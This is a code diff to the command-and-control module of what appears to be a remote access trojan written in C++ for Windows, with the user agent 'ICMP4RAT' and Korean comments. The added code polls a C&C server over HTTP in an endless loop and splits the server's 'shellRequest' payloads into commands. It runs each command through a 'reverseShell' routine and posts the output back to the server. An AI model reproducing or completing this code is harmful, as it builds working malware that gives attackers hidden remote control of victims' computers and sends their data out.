@@ -4,27 +4,17 @@
 #include <map>
 #include <ole2.h>
 #include <olectl.h>
+#include <list>
+#include <sstream>
 #include "cncManager.h"
+#include "commandManager.h"
 
 cncManager::cncManager() {
-	this->hSession = WinHttpOpen(L"ICMP4RAT", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
-
-	if (this->hSession)
-		this->hConnect = WinHttpConnect(this->hSession, this->server, INTERNET_DEFAULT_HTTP_PORT, 0);
-
-	if (this->hConnect)
-		this->hRequest = WinHttpOpenRequest(this->hConnect, L"POST", this->index, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
 }
+
 
 cncManager::cncManager(LPCWSTR server) {
 	this->server = server;
-	this->hSession = WinHttpOpen(L"ICMP4RAT", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
-
-	if (this->hSession)
-		this->hConnect = WinHttpConnect(this->hSession, this->server, INTERNET_DEFAULT_HTTP_PORT, 0);
-
-	if (this->hConnect)
-		this->hRequest = WinHttpOpenRequest(this->hConnect, L"POST", this->index, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
 }
 
 cncManager::~cncManager() {
@@ -35,11 +25,19 @@ cncManager::~cncManager() {
 
 /* C&C에 http request를 보내는 함수. send후 response parsing을 호출함. */
 void cncManager::sendHttpRequest(LPVOID data, DWORD dlen) {
+    this->hSession = WinHttpOpen(L"ICMP4RAT", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
+
+    if (this->hSession)
+        this->hConnect = WinHttpConnect(this->hSession, this->server, INTERNET_DEFAULT_HTTP_PORT, 0);
+
+    if (this->hConnect)
+        this->hRequest = WinHttpOpenRequest(this->hConnect, L"POST", this->index, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
+
     DWORD dwSize = 0;
     DWORD dwDownloaded = 0;
 
-    if (hRequest)
-        bResults = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, data, dlen, dlen, 0);
+    if (this->hRequest)
+        this->bResults = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, data, dlen, dlen, 0);
 
     if (this->bResults)
         this->bResults = WinHttpReceiveResponse(this->hRequest, NULL);
@@ -87,9 +85,13 @@ void cncManager::sendHttpRequest(LPVOID data, DWORD dlen) {
 
         } while (dwSize > 0);
     }
+
+    if (this->hRequest) WinHttpCloseHandle(this->hRequest);
+    if (this->hConnect) WinHttpCloseHandle(this->hConnect);
+    if (this->hSession) WinHttpCloseHandle(this->hSession);
 }   
 /* C&C에 데이터 보내는 함수. sendHttpRequest를 Wrapping함. */
-void cncManager::sendData(UCHAR DDtype, DWORD dlen, LPVOID data) {
+void cncManager::sendData(UCHAR DDtype, ULONG64 dlen, LPVOID data) {
     if (dlen <= 0xffff) {
         DDprotocol* ftpFrame = new DDprotocol;
         ftpFrame->type = DDtype;
@@ -134,16 +136,16 @@ void cncManager::responseParser(UCHAR* res, DWORD len) {
         resData->type = res[1];
         resData->len = *(USHORT *)(res+2);
         resData->seq = *(DWORD *)(res+4);
-        /* For DEBUG */
-        printf("-------------------\n");
-        printf("header : 0x%x\ntype   : 0x%x\nlen    : 0x%x\nseq    : 0x%x\n", resData->header, resData->type, resData->len, resData->seq);
-        printf("-------------------\n");
+        ///* For DEBUG */
+        //printf("-------------------\n");
+        //printf("header : 0x%x\ntype   : 0x%x\nlen    : 0x%x\nseq    : 0x%x\n", resData->header, resData->type, resData->len, resData->seq);
+        //printf("-------------------\n");
 
         if (resData->header != DDPROTO_HEADER)
             std::cout << "Invalid Header !!!" << std::endl;
-        
 
         else {
+            std::string data = (char*)(res + 8);
             /* response 핸들러 구현부 */
             switch (resData->type)
             {
@@ -156,15 +158,22 @@ void cncManager::responseParser(UCHAR* res, DWORD len) {
                 break;
 
             case shellRequest:
+            {
                 std::cout << "shellRequest !!!" << std::endl;
+                std::istringstream spliter(data);
+                std::string tmp;
+                while (std::getline(spliter, tmp, ';')) {
+                    this->shellCmd.push_back(tmp);
+                }
                 break;
+            }
 
             case ftpReqeust:
                 std::cout << "ftpReqeust !!!" << std::endl;
                 break;
 
             case none:
-                std::cout << "none !!!" << std::endl;
+                //std::cout << "none !!!" << std::endl;
                 break;
 
             default:
@@ -176,4 +185,21 @@ void cncManager::responseParser(UCHAR* res, DWORD len) {
         }
     }
 
+}
+
+void cncManager:: handleShellRequest(commandManager& commander) {
+    std::string result;
+    while (TRUE) {
+        /* For DEBUG */
+        this->sendData(1, 0, NULL);
+
+        while (!this->shellCmd.empty()) {
+            result = commander.reverseShell(this->shellCmd.front());
+            /* For DEBUG */
+            std::cout << result;
+            this->sendData(shellResponse, result.size(), (LPVOID)result.c_str());
+            this->shellCmd.pop_front();
+        }
+            Sleep(1000);
+    }
 }
